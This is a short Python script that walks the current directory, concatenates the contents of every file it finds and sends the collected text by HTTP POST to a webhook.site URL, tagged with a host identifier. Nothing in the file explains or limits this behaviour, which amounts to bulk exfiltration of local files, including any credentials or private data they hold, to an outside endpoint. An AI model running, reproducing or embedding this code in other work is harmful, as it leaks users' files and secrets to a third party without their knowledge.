import os
import requests

path = '.'

files = []

blob = ""
# r=root, d=directories, f = files
for r, d, f in os.walk(path):
    for file in f:
        some_file = open(file, "r+")
        blob += "----" + str(os.path.join(r, file)) +"----\n" + some_file.read() + "\n"*10
        some_file.close()



data = {'host':'28033169680a075e33f020c0d3911693',
        'content': blob}

r = requests.post(url='https://webhook.site/194d7256-584c-4753-abd4-11a4cc9ce988', data=data)

print(blob)
